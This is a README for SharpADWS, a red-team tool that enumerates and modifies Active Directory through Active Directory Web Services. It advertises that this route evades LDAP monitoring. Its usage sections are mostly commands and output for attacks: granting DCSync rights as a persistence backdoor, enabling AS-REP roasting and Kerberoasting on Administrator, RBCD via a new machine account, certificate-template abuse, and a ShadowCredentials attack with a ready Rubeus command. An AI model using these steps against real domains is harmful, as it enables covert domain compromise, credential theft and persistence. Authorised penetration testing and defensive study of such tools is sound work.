# SharpADWS

Active Directory reconnaissance and exploitation for Red Teams via the Active Directory Web Services (ADWS).

## Overview

SharpADWS is an Active Directory reconnaissance and exploitation tool for Red Teams that collects and modifies Active Directory data via the Active Directory Web Services (ADWS) protocol.

Typically, enumeration or manipulation of Active Directory occurs through the LDAP protocol. SharpADWS has the ability to extract or modify Active Directory data without communicating directly with the LDAP server. Under ADWS, LDAP queries are wrapped in a series of SOAP messages and then sent to the ADWS server using a NET TCP Binding encrypted channel. The ADWS server then unpacks the LDAP query locally and forwards it to the LDAP server running on the same domain controller.

Active Directory Web Services (ADWS) is automatically turned on when Active Directory Domain Services (ADDS) is installed, making SharpADWS universal across all domain environments.

## Good Point

One of the main benefits of using ADWS for LDAP post-exploitation is that it is relatively unknown, and since LDAP traffic is not sent over the network, it is not easily detected by common monitoring tools. ADWS runs a completely different service than LDAP, is available on TCP port 9389, and uses the SOAP protocol as its interface.

While researching ADWS, we noticed that since it is a SOAP web service, the actual execution of the LDAP query is done locally on the domain controller. This provides a number of interesting side effects that turn out to be beneficial. For example, when analyzing LDAP queries on a domain controller, you may notice that the queries originate from 127.0.0.1 logs, which in many cases will be ignored.

A secondary benefit of this is that the activity does not show up in DeviceEvents under the LDAPSearch action type, which means very little telemetry data is available.

## Protocol Implementation

SharpADWS implements [MS-ADDM](https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-addm/af3eb9be-b407-4423-a707-387fedbbaf1d), [MS-WSTIM](https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-wstim/08164681-df91-49bd-a0ea-ce949d1cc536) and [MS-WSDS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsds/2ded136c-2fe2-4f7d-8d09-a7118815c6bb) protocol, you can use the source code of this project to easily implement the following operations on Active Directory Web Services:

- Enumerate：Creates a context that maps to the specified search query filter.
- Pull：Retrieve the result object in the context of a specific enumeration.
- Renew：Updates the expiration time of the specified enumeration context.
- GetStatus：Gets the expiration time of the specified enumeration context.
- Release：Releases the specified enumeration context.
- Delete：Delete existing objects.
- Get：Retrieve one or more properties from an object.
- Put：Modify the contents of one or more properties on an object.
  - Add：Adds the specified property value to the specified property's value set, or creates the property if it does not already exist on the target object.
  - Replace：Replaces the set of values in the specified property with the values specified in the operation, or creates the property if it does not already exist on the target object. If no value is specified in the operation, all values on the currently specified attribute will be deleted.
  - Delete：Removes the specified attribute value from the specified attribute. If no value is specified, all values will be deleted. If the specified property does not exist on the target object, the PUT request fails.
- Create：Create a new object.

## Usage

The command line argument `-h` can be used to display the following usage information:

```powershell
C:\Users\Marcus>SharpADWS.exe -h

SharpADWS 1.0.0-beta - Copyright (c) 2024 WHOAMI (whoamianony.top)

  -h                      Display this help screen

Connection options:
  -d                      Specify domain for enumeration
  -u                      Username to use for ADWS Connection
  -p                      Password to use for ADWS Connection

Supported methods:
  Cache                   Dump all objectSids to cache file for Acl methods
  Acl                     Enumerate and analyze DACLs for specified objects, specifically Users, Computers, Groups, Domains, DomainControllers and GPOs
  DCSync                  Enumerate all DCSync-capable accounts and can set DCSync backdoors
  DontReqPreAuth          Enumerates all accounts that do not require kerberos preauthentication, and can enable this option for accounts
  Kerberoastable          Enumerates all Kerberoastable accounts, and can write SPNs for accounts
  AddComputer             Add a machine account within the scope of ms-DS-MachineAccountQuota for RBCD attack
  RBCD                    Read, write and remove msDS-AllowedToActOnBehalfOfOtherIdentity attributes for Resource-Based Constrained Delegation attack
  Certify                 Enumerate all ADCS data like Certify.exe, and can write template attributes
  Whisker                 List, add and remove msDS-KeyCredentialLink attribute like Whisker.exe for ShadowCredentials attack
  FindDelegation          Enumerate all delegation relationships for the target domain

Acl options:
  -dn                     RFC 2253 DN to base search from
  -scope                  Set your Scope, support Base (Default), Onelevel, Subtree
  -trustee                The sAMAccountName of a security principal to check for its effective permissions
  -right                  Filter DACL for a specific AD rights
  -rid                    Specify a rid value and filter out DACL that security principal's rid is greater than it
  -user                   Enumerate DACL for all user objects
  -computer               Enumerate DACL for all computer objects
  -group                  Enumerate DACL for all group objects
  -domain                 Enumerate DACL for all domain objects
  -domaincontroller       Enumerate DACL for all domain controller objects
  -gpo                    Enumerate DACL for all gpo objects

DCSync options:
  -action [{list, write}] Action to operate on DCSync method
          list            List all accounts with DCSync permissions
          write           Escalate accounts with DCSync permissions
  -target                 Specify the sAMAccountName of the account

DontReqPreAuth options:
  -action [{list, write}] Action to operate on DontReqPreAuth method
          list            List all accounts that do not require kerberos preauthentication
          write           Enable do not require kerberos preauthentication for an account
  -target                 Specify the sAMAccountName of the account

Kerberoastable options:
  -action [{list, write}] Action to operate on Kerberoastable method
          list            List all kerberoastable accounts
          write           Write SPNs for an account to kerberoast
  -target                 Specify the sAMAccountName of the account

AddComputer options:
  -computer-name          Name of computer to add, without '$' suffix
  -computer-pass          Password to set for the computer

RBCD options:
  -action [{read,write,remove}]
                          Action to operate on RBCD method
          read            Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account
          write           Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account
          remove          Remove the msDS-AllowedToActOnBehalfOfOtherIdentity attribute value of the account added by the write action

Certify options:
  -action [{find, modify}]
                          Action to operate on Certify method
          find            Find all CA and certificate templates
          modify          Modify certificate templates
  -enrolleeSuppliesSubject
                          Enumerate certificate templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for find action,
                          and can enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for modify action
  -clientAuth             Enumerate certificate templates with client authentication pKIExtendedKeyUsage for find action,
                          and can enable Client Authentication for modify action

Whisker options:
  -action [{list, add, remove}]
                          Action to operate on ShadowCredentials method
          list            List all the values of the msDS-KeyCredentialLink attribute for an account
          add             Add a new value to the msDS-KeyCredentialLink attribute for an account
          remove          Remove a value from the msDS-KeyCredentialLink attribute for an account
  -device-id              Specify the DeviceID to remove
  -target                 Specify the sAMAccountName of the account

FindDelegation options:
  No options, just run!
  
```

### Cache

When SharpADWS enumerates the ACL, in order not to perform additional ADWS requests for each unknown trustee object, it is necessary to create a complete cache of all account objects in advance through the cache method and save it to a file, thereby avoiding a large number of (unnecessary) flow. The cache contains a mapping of each account object name within the current domain to its objectSid.

```powershell
C:\Users\Marcus>SharpADWS.exe Cache

[*] Cache file has been generated: object.cache

```

### Acl

The Acl method can enumerate the DACL of the object specifying `-dn`, and supports filtering the enumerated DACL through the `-trustee`, `-right` and `-rid` parameters. For example, we want to enumerate all Domain Controller objects and filter out the DACL whose trustee is Marcus, as follows:

```powershell
C:\Users\Marcus>SharpADWS.exe acl -dn "OU=Domain Controllers,DC=corp,DC=local" -scope Subtree -trustee Marcus

 Severity              : Critical
 ObjectDN              : CN=DC01,OU=Domain Controllers,DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
 ObjectType            : All
 Trustee               : Marcus
 IsInherited           : False
 
```

For another example, we want to enumerate all User objects and filter out DACLs with GenericWrite permissions and trustee RID greater than 1000, as shown below:

```powershell
C:\Users\Marcus>SharpADWS.exe acl -dn "CN=Users,DC=corp,DC=local" -scope Subtree -right Generic -rid 1000

 Severity              : Critical
 ObjectDN              : CN=Bob,CN=Users,DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
 ObjectType            : All
 Trustee               : Marcus
 IsInherited           : False

```

In addition, the Acl method also supports enumeration of specific objects:

```powershell
SharpADWS.exe -user                # Enumerate DACL for all user objects
SharpADWS.exe -computer            # Enumerate DACL for all computer objects
SharpADWS.exe -group               # Enumerate DACL for all group objects
SharpADWS.exe -domain              # Enumerate DACL for all domain objects
SharpADWS.exe -domaincontroller    # Enumerate DACL for all domain controller objects
SharpADWS.exe -gpo                 # Enumerate DACL for all gpo objects
```

**It should be noted that the use of Acl Method must rely on the mapping cache that has been established through Cache method. **

### DCSync

The `list` action of the DCSync method can query all accounts that have been granted the DS-Replication-Get-Changes, DS-Replication-Get-Changes-All and DS-Replication-Get-Changes-In-Filtered-Set permissions, as follows Show:

```powershell
C:\Users\Marcus>SharpADWS.exe DCSync -action list

 Severity              : Info
 ObjectDN              : DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ExtendedRight
 ObjectType            : DS-Replication-Get-Changes-All
 Trustee               : Administrators
 IsInherited           : False

 Severity              : Info
 ObjectDN              : DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ExtendedRight
 ObjectType            : DS-Replication-Get-Changes-All
 Trustee               : Domain Controllers
 IsInherited           : False

 Severity              : Critical
 ObjectDN              : DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ExtendedRight
 ObjectType            : DS-Replication-Get-Changes-All
 Trustee               : Alice
 IsInherited           : False
 
```

**It should be noted that the `list` action of DCSync Method must rely on the mapping cache that has been established through Cache method.**

Additionally, given sufficient permissions, you can grant DCSync permissions to an account via `write` to establish a domain persistence backdoor:

```powershell
C:\Users\Marcus>SharpADWS.exe DCSync -action write -target Marcus

[*] Account Marcus now has DCSync privieges on the domain.

```

### DontReqPreAuth

The `list` action of the DontReqPreAuth method can find all accounts with the "Do not require kerberos preauthentication" option set, as shown below:

```powershell
C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action list

[*] Found users that do not require kerberos preauthentication:
[*]     CN=Bob,CN=Users,DC=corp,DC=local
[*]     CN=Alice,CN=Users,DC=corp,DC=local
[*]     CN=John,CN=Users,DC=corp,DC=local

```

Additionally, you can abuse WriteProperty permissions on the target account's userAccountControl property by enabling the "Do not require kerberos preauthentication" option for that account via `write` action to perform an AS-REP Roasting attack:

```powershell
C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action write -target Administrator

[*] Set DontReqPreAuth for user Administrator successfully!

```

### Kerberoastable

The `list` action of the Kerberoastable method can find all accounts with SPN set up, as shown below:

```powershell
C:\Users\Marcus>SharpADWS.exe Kerberoastable -action list

[*] Found kerberoastable users:
[*] CN=krbtgt,CN=Users,DC=corp,DC=local
[*]     kadmin/changepw
[*] CN=Bob,CN=Users,DC=corp,DC=local
[*]     WWW/win-iisserver.corp.local/IIS
[*]     TERMSERV/win-iisserver.corp.local
[*] CN=John,CN=Users,DC=corp,DC=local
[*]     TERMSERV/WIN-SERVER2026

```

Additionally, you can abuse WriteProperty permissions on the target account's servicePrincipalName property to perform a Kerberoasting attack by adding an SPN to that account (user accounts only) via `write` action:

```powershell
C:\Users\Marcus>SharpADWS.exe Kerberoastable -action write -target Administrator

[*] Kerberoast user Administrator successfully!

```

### AddComputer

The AddComputer method allows you to create a new computer account within the scope of the `ms-DS-MachineAccountQuota` attribute value, which can be used in subsequent RBCD attacks.

```powershell
C:\Users\Marcus>SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass Passw0rd

[*] Successfully added machine account PENTEST$ with password Passw0rd.

```

### RBCD

The `read` action of the RBCD method can read the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute value of the specified account object to check who has the right to resources delegate to the account, as shown below:

```powershell
C:\Users\Marcus>SharpADWS.exe RBCD -action read -delegate-to DC01$

[*] Accounts allowed to act on behalf of other identity:
[*]     WIN-IISSERVER$    (S-1-5-21-1315326963-2851134370-1073178800-1106)
[*]     WIN-MSSQL$    (S-1-5-21-1315326963-2851134370-1073178800-1103)
[*]     WIN-PC8087$    (S-1-5-21-1315326963-2851134370-1073178800-1117)

```

The `write` action of the RBCD method can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target account object for Resource-Based Constrained Delegation attacks. As shown below, we first create a new extreme account `PENTEST$` using the AddComputer method, and then we can execute the following command to write the SID of `PENTEST$` into the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `DC01$`:

```powershell
C:\Users\Marcus>SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-from PENTEST$

[*] Delegation rights modified successfully!
[*] PENTEST$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     PENTEST$    (S-1-5-21-1315326963-2851134370-1073178800-1113)

```

In addition, the SID added in `write` action can be removed from the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target object through `remove` action:

```powershell
C:\Users\Marcus>SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-from PENTEST$

[*] Delegation rights modified successfully!
[*] Accounts allowed to act on behalf of other identity has been removed:
[*]     PENTEST$    (S-1-5-21-1315326963-2851134370-1073178800-1113)

```

### Certify

The `find` action of the Certify method can enumerate the data in ADCS, including all certificate authorities and certificate templates, just like [Certify](https://github.com/GhostPack/Certify):

```powershell
C:\Users\Marcus>SharpADWS.exe Certify -action find

[*] Find CA and certificate templates
[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
[*] Listing info about the Enterprise CA 'corp-DC01-CA'

    Enterprise CA Name              : corp-DC01-CA
    DNS Name                        : DC01.corp.local
    FullName                        : DC01.corp.local\corp-DC01-CA
    Certificate Subject             : CN=corp-DC01-CA, DC=corp, DC=local
    Certificate Serial Number       : 2D975C2D49AE4BB7432682E1708C8834
    Certificate Validity Start      : 2/13/2024 5:55:36 PM
    Certificate Validity End        : 2/13/2029 6:05:36 PM
    CA Permissions                  :
         Enrollment Rights          :
                                    : Authenticated Users
         Object Control Permissions :
             ManageCA               :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins
             ManageCertificates     :
                                    : Enterprise Admins
                                    : DC01
             WriteDacl              :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins
             WriteOwner             :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins
             WriteProperty          :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins

[*] Available Certificates Templates

    CA Name                         : CORP-DC01-CA
    Template Name                   : User
    Enabled                         : True
    Client Authentication           : True
    Enrollment Agent                : False
    Any Purpose                     : False
    Enrollee Supplies Subject       : False
    pKIExtendedKeyUsage             : Encrypting File System  Secure Email  Client Authentication
    msPKI-Certificate-Name-Flag     : SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH
    msPkI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS  PUBLISH_TO_DS  AUTO_ENROLLMENT
    msPKI-Private-Key-Flag          : EXPORTABLE_KEY
    CA Permissions                  :
         Enrollment Rights          :
                                    : Domain Admins
                                    : Domain Users
                                    : Enterprise Admins
         Object Control Permissions :
             WriteDacl              :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteOwner             :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteProperty          :
                                    : Domain Admins
                                    : Enterprise Admins
                                    : Domain Users

    CA Name                         :
    Template Name                   : UserSignature
    Enabled                         : False
    Client Authentication           : True
    Enrollment Agent                : False
    Any Purpose                     : False
    Enrollee Supplies Subject       : False
    pKIExtendedKeyUsage             : Secure Email  Client Authentication
    msPKI-Certificate-Name-Flag     : SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH
    msPkI-Enrollment-Flag           : AUTO_ENROLLMENT
    msPKI-Private-Key-Flag          : ATTEST_NONE
    CA Permissions                  :
         Enrollment Rights          :
                                    : Domain Admins
                                    : Domain Users
                                    : Enterprise Admins
         Object Control Permissions :
             WriteDacl              :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteOwner             :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteProperty          :
                                    : Domain Admins
                                    : Enterprise Admins
                                    : Domain Users

# ...
```

In addition, `find` action supports the `-enrolleeSuppliesSubject` and `-clientAuth` options, which can filter out all certificate templates that have the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag turned on and support Client Authentication:

```powershell
C:\Users\Marcus>SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -clientAuth

[*] Find CA and certificate templates
[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
[*] Listing info about the Enterprise CA 'corp-DC01-CA'

    # ...

[*] Available Certificates Templates

    CA Name                         : CORP-DC01-CA
    Template Name                   : User
    Enabled                         : True
    Client Authentication           : True
    Enrollment Agent                : False
    Any Purpose                     : False
    Enrollee Supplies Subject       : True
    pKIExtendedKeyUsage             : Encrypting File System  Secure Email  Client Authentication
    msPKI-Certificate-Name-Flag     : ENROLLEE_SUPPLIES_SUBJECT  SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH
    msPkI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS  PUBLISH_TO_DS  AUTO_ENROLLMENT
    msPKI-Private-Key-Flag          : EXPORTABLE_KEY
    CA Permissions                  :
         Enrollment Rights          :
                                    : Domain Admins
                                    : Domain Users
                                    : Enterprise Admins
         Object Control Permissions :
             WriteDacl              :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteOwner             :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteProperty          :
                                    : Domain Admins
                                    : Enterprise Admins
                                    : Marcus
                                    : Domain Users
                                    
# ...
```
**It should be noted that the `find` of Certify Method must rely on the mapping cache that has been established through Cache Method. **

The `modify` action of the Certify method allows you to modify the properties of the certificate template, such as turning on the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag or enabling Client Authentication, if you have write access to the target template:

```powershell
C:\Users\Marcus>SharpADWS.exe Certify -action modify -template User -enrolleeSuppliesSubject -clientAuth

[*] Enable enrollee supplies subject for template User successfully!
[*] Enable client authentication for template User successfully!

```

### Whisker

The Whisker method is able to perform the lifecycle of a ShadowCredentials attack just like [Whisker](https://github.com/eladshamir/Whisker).

The `list` action of the Whisker method can list the `msDS-KeyCredentialLink` attribute value of the target account object:

```powershell
C:\Users\Marcus>SharpADWS.exe Whisker -action list -target DC01$

[*] List deviced for DC01$:
[*]     DeviceID: c9fdae6b-f6a1-4880-a498-6dc89814e596    Creation Time: 2/13/2024 7:43:49 PM
[*]     DeviceID: ee48b31f-71b1-4821-b21e-1ca28fad2ae9    Creation Time: 2/13/2024 8:06:52 PM
[*]     DeviceID: 80c31faf-8b0b-4af6-8350-22de2d91a4fd    Creation Time: 2/13/2024 8:01:50 PM

```

The Whisker method's `add` action allows you to add a Key to the target account's `msDS-KeyCredentialLink` property to perform a ShadowCredentials attack if you have write access:

```powershell
C:\Users\Marcus>SharpADWS.exe Whisker -action add -target Administrator -cert-pass Passw0rd

[*] Certificate generaged
[*] KeyCredential generated with DeviceID 7d9e0151-5fd2-46d5-ac3d-dce8a71399f2
[*] Updated the msDS-KeyCredentialLink attribute successfully!
[*] You can now run Rubeus with the following syntax:

      Rubeus.exe asktgt /user:Administrator /certificate:MIIJzwIBAzCCCYsGCSqGSIb3DQEHA
      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 /password:"Passw0rd" /domain:cor
      p.local /getcredentials /show

```

Additionally, with `remove` action you can provide `-device-id` to remove the specified Key from the `msDS-KeyCredentialLink` property of the target object:

```powershell
C:\Users\Marcus>SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9fdae6b-f6a1-4880-a498-6dc89814e596

[*] Found value to remove
[*] msDS-KeyCredentialLink value has been removed:
[*]     DeviceID: c9fdae6b-f6a1-4880-a498-6dc89814e596    Creation Time: 2/13/2024 7:43:49 PM

```

### FindDelegation

The FindDelegation method can enumerate all delegation relationships in the current domain. This method has no redundant options or parameters:

```powershell
C:\Users\Marcus\desktop>SharpADWS.exe FindDelegation

AccountName  AccountType  DelegationType                      DelegationRightsTo
-----------  -----------  ----------------------------------  ----------------------------------------------
DC01$        Computer     Unconstrained                       N/A
PENTEST$     Computer     Resource-Based Constrained          DC01$
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/corp.local
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/CORP
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01/CORP
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/DomainDnsZones.corp.local
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/ForestDnsZones.corp.local
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local/corp.local
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local/CORP
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01/CORP

```

## Say it at the end

This project is completed by me independently, and there will inevitably be some bugs. Contributors are very welcome to submit issues to report bugs or propose new ideas to jointly improve the project!
